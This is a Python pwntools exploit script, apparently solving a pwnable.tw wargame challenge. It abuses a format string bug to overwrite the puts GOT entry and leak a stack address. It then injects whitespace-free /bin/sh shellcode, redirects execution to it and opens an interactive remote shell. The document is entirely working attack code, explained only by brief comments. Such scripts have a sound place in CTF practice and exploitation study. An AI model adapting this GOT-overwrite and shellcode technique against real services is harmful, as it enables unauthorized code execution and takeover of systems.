from pwnlib.tubes.remote import remote
from pwnlib.util.packing import p32
from libformatstr import FormatStr
from time import sleep

argnum = 7
padding = 0
puts_got = 0x08049A48
print_addr = 0x080486C7
no_whitespace_shellcode = '\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68' \
                          '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04' \
                          '\xcd\x80\xc0\xe8\x03\xcd\x80'

r = remote('pwning.pwnable.tw', 56026)

# Change the GOT entry of puts to the address right before the
# format string bug and leak some information about stack at
# the same time. This allows us to exploit the same bug again
# with all information needed.
print r.recvuntil(':')
fmt = FormatStr()
fmt[puts_got] = print_addr
r.sendline(fmt.payload(argnum, padding) + '%33$x')

# Calculate the address where the shellcode is going to be placed
# from the information leaked by the format string '%33$x' above.
result = r.recvuntil(':')
print result
print 'stack debris:', result[-34:-26]
shellcode_addr = int(result[-34:-26], 16) - 216
print 'shellcode address:', hex(shellcode_addr)

# Change the GOT entry of puts to the address of the shellcode
fmt = FormatStr()
fmt[puts_got] = shellcode_addr
r.sendline(fmt.payload(argnum, padding) + no_whitespace_shellcode)

sleep(0.5)
r.interactive()
